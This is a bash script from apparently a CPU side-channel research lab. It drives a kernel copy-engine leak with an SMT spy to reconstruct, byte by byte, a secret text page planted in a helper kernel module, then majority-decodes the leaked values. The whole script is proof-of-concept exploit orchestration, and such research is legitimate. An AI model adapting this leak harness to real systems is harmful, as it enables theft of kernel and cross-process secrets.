#!/usr/bin/env bash
# Stage 2 M3: per-byte reconstruction of the helper module's secret text
# page through the kernel rep-movs copy-engine leak (SMT sibling sampler).
#
# Usage (as the normal user, from this directory):
#   bash reload.sh text          # load the module with the built-in text page
#   bash reconstruct.sh          # roll-call gate + per-byte window walk
#   SWZ=1 bash reconstruct.sh    # + swizzle pass -> full 8-bit bytes
#
# Geometry (measured 2026-10-05): a KCOPY bytewalk at allocation offset P
# (a loop of 1-byte rep movsb) makes the spy's eight rows carry the secret
# page bytes [P+16 .. P+23] during round 0 (row r = byte P+16+r; a second
# window sits near P+47). So to read secret byte i, run the walk at
# P = SECRET + i - 16; i < 16 lands in the source page and the engine's
# read-ahead crosses into the secret page. Each run also exposes i+1..i+7,
# so every byte collects up to 8 independent votes (majority decode).
# Votes come from the spy top3 dump: per row, the strongest non-zero class
# with >= MINHITS hits (class 0 is the known all-ones gather artifact).
# Decode: low6 = class ^ 0x3f; the swizzle pass (page rotated right by 2)
# moves bits 7..2 into the window, so b6 = z>>4&1, b7 = z>>5&1 with
# z = swizzled low6 completes the byte. Logs: /tmp/rec-*.log
set -u

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$HERE"

if [ ! -e /dev/gds_helper_lkm ]; then
    echo "error: /dev/gds_helper_lkm not present; run: bash reload.sh text" >&2
    exit 2
fi

SECRET=${SECRET:-4096}        # 0x1000: secret page starts one page into source
COUNT=${COUNT:-58}            # built-in text is 58 chars, then zero padding
LEAD=${LEAD:-16}              # measured: round-0 window starts at P + LEAD
BURST=${BURST:-16384}         # 1-byte copies per ioctl (bytewalk iterations)
ROUNDS=${ROUNDS:-2}
TRIALS=${TRIALS:-64}
LOADS=${LOADS:-4}
MINHITS=${MINHITS:-8}         # hits for a row's top class to count as a vote
SWZ=${SWZ:-0}
RUNID=$(date +%H%M%S)

sudo pkill -x ktrigger 2>/dev/null || true

row_classes() { # log -> "row class" lines for round 0 (class -1 if none)
    awk -v minhits="$MINHITS" '
        $1 == "round" && $2 == 0 && $5 == "top3" {
            for (i = 6; i <= 8; i++) {
                split($i, p, ":");
                if (p[1] != "-1" && p[1] != "0" &&
                    (p[2] + 0) >= minhits) {
                    print $4, p[1];
                    next
                }
            }
            print $4, -1
        }' "$1" 2>/dev/null
}

one_run() { # tag offset -> "row class" lines for round 0
    local tag="$1" off="$2"
    local log="/tmp/rec-$tag-$RUNID.log"
    local kp

    env CPU=3 MODE=kcopy KOP=bytewalk OFFSET="$off" LEN="$BURST" \
        ./ktrigger >"$log" 2>&1 &
    kp=$!
    sleep 0.2
    sudo env CPU=1 CANARY=0x47 ROUNDS="$ROUNDS" TRIALS="$TRIALS" \
        LOADS="$LOADS" PRINT=1 ../spy/spy >>"$log" 2>&1
    kill "$kp" 2>/dev/null
    wait "$kp" 2>/dev/null
    row_classes "$log"
}

char_of() { # class -> printable candidate(s): "G", "(2|r)", or "?"
    local cls=$1 low v c s=""

    case "$cls" in "" | -1) printf '?'; return ;; esac
    low=$((cls ^ 63))
    for v in $low $((low + 64)) $((low + 128)); do
        if [ "$v" -ge 32 ] && [ "$v" -le 126 ]; then
            c=$(printf "\\$(printf '%03o' "$v")")
            s="$s$c"
        fi
    done
    case ${#s} in
        0) printf '?' ;;
        1) printf '%s' "$s" ;;
        *) printf '(%s)' "$(printf '%s' "$s" | sed 's/./&|/g; s/|$//')" ;;
    esac
}

walk() { # tag -> "byte class" votes on stdout (byte = run i + row)
    local tag="$1" i off r c
    for ((i = 0; i < COUNT; i++)); do
        off=$(printf '0x%x' $((SECRET + i - LEAD)))
        while read -r r c; do
            echo $((i + r)) "$c"
        done < <(one_run "$tag-i$i" "$off")
    done
}

decode_votes() { # votes file -> "byte best_class votes" sorted by byte
    awk '
        $2 != -1 { key = $1 " " $2; cnt[key]++; seen[$1] = 1 }
        END {
            for (b in seen) {
                best = -1; bestn = 0; s = ""
                for (k in cnt) {
                    split(k, kv, " ")
                    if (kv[1] + 0 == b + 0) {
                        s = s sprintf(" %s:%d", kv[2], cnt[k])
                        if (cnt[k] > bestn ||
                            (cnt[k] == bestn && kv[2] + 0 < best + 0)) {
                            best = kv[2] + 0; bestn = cnt[k]
                        }
                    }
                }
                printf "%d %d%s\n", b, best, s
            }
        }' "$1" | sort -n
}

# roll-call gate: with the window model, secret byte i reads at
# P = SECRET + i - 16 and lands in round-0 row 0. Gate on i=16 ('S',
# class 44, the previously measured configuration); i=0 ('G', 56, the
# source-page read-ahead) and i=6 ('-', 18) are printed for the record.
probe() { # idx want mode -> 0/1
    local idx="$1" want="$2" mode="$3"
    local off got
    off=$(printf '0x%x' $((SECRET + idx - LEAD)))
    got=$(one_run "probe$idx" "$off" | awk '$1 == 0 { print $2 }')
    [ -n "$got" ] || got=-1
    echo "probe idx=$idx offset=$off want_row0=$want got_row0=$got ($mode)"
    [ "$mode" != gate ] || [ "$got" = "$want" ]
}
probe_ok=1
probe 16 44 gate || probe_ok=0
probe 0 56 soft || true
probe 6 18 soft || true
if [ "$probe_ok" != 1 ]; then
    echo "error: roll-call gate failed; window model not established" >&2
    exit 2
fi
echo

echo "== pass A (rotate 0): window votes, low6 = class ^ 0x3f"
walk passA >/tmp/rec-votes-A-$RUNID.txt
decode_votes /tmp/rec-votes-A-$RUNID.txt >/tmp/rec-best-A-$RUNID.txt
while read -r b cls votes; do
    ch=$(char_of "$cls")
    printf 'byte=%2d cls=%s char=%s votes:%s\n' "$b" "$cls" "$ch" "$votes"
done </tmp/rec-best-A-$RUNID.txt
stringA=""
for ((b = 0; b < COUNT; b++)); do
    cls=$(awk -v b="$b" '$1 == b { print $2 }' /tmp/rec-best-A-$RUNID.txt)
    if [ -n "$cls" ]; then
        ch=$(char_of "$cls")
    else
        ch='?'
    fi
    stringA="$stringA$ch"
done
echo "recovered6=$stringA"

if [ "$SWZ" = 1 ]; then
    echo
    echo "== swizzle pass (rotate right 2) then pass B"
    env CPU=3 MODE=swz S=2 ./ktrigger
    walk passB >/tmp/rec-votes-B-$RUNID.txt
    decode_votes /tmp/rec-votes-B-$RUNID.txt >/tmp/rec-best-B-$RUNID.txt
    stringB=""
    while read -r b cls1 _v1; do
        cls2=$(awk -v b="$b" '$1 == b { print $2 }' \
            /tmp/rec-best-B-$RUNID.txt)
        if [ "$cls1" = -1 ] || [ -z "$cls2" ] || [ "$cls2" = -1 ]; then
            printf 'byte=%2d clsA=%s clsB=%s (incomplete)\n' \
                "$b" "$cls1" "${cls2:-?}"
            [ "$b" -lt "$COUNT" ] && stringB="$stringB?"
            continue
        fi
        low1=$((cls1 ^ 63))
        z=$((cls2 ^ 63))
        byt=$((((z >> 5) & 1) * 128 + ((z >> 4) & 1) * 64 + low1))
        if [ "$byt" -ge 32 ] && [ "$byt" -le 126 ]; then
            ch=$(printf "\\$(printf '%03o' "$byt")")
        else
            ch=$(printf '(x%02x)' "$byt")
        fi
        printf 'byte=%2d clsA=%s clsB=%s byte=0x%02x char=%s\n' \
            "$b" "$cls1" "$cls2" "$byt" "$ch"
        [ "$b" -lt "$COUNT" ] && stringB="$stringB$ch"
    done </tmp/rec-best-A-$RUNID.txt
    echo "recovered8=$stringB"
    env CPU=3 MODE=swz S=0 ./ktrigger >/dev/null
fi

echo
echo "logs: /tmp/rec-*-$RUNID.log"
